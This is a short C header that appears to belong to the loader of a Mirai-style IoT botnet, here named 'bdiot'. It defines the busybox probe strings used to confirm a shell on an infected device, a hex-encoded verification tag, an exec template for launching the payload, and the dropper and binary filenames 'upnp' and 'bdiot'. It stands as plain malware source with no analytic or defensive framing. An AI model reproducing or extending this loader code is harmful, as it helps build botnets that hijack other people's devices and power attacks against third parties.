#pragma once

#include <stdint.h>

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define FALSE 0
#define TRUE 1
typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define LOADER_LITTLE_ENDIAN

#define ATOMIC_ADD(ptr, i) __sync_fetch_and_add((ptr), i)
#define ATOMIC_SUB(ptr, i) __sync_fetch_and_sub((ptr), i)
#define ATOMIC_INC(ptr) ATOMIC_ADD((ptr), 1)
#define ATOMIC_DEC(ptr) ATOMIC_SUB((ptr), 1)
#define ATOMIC_GET(ptr) ATOMIC_ADD((ptr), 0)

#define VERIFY_STRING_HEX "\\x62\\x64\\x69\\x6f\\x74"
#define VERIFY_STRING_CHECK "bdiot"

#define TOKEN_QUERY "/bin/busybox bdiot"
//#define TOKEN_QUERY "./bdiot"
#define TOKEN_RESPONSE "bdiot: applet not found"

#define EXEC_QUERY "./bdiot %s %d"
#define EXEC_RESPONSE "bdiot: applet not found"

#define FN_DROPPER "upnp"
#define FN_BINARY "bdiot"

extern char *id_tag;
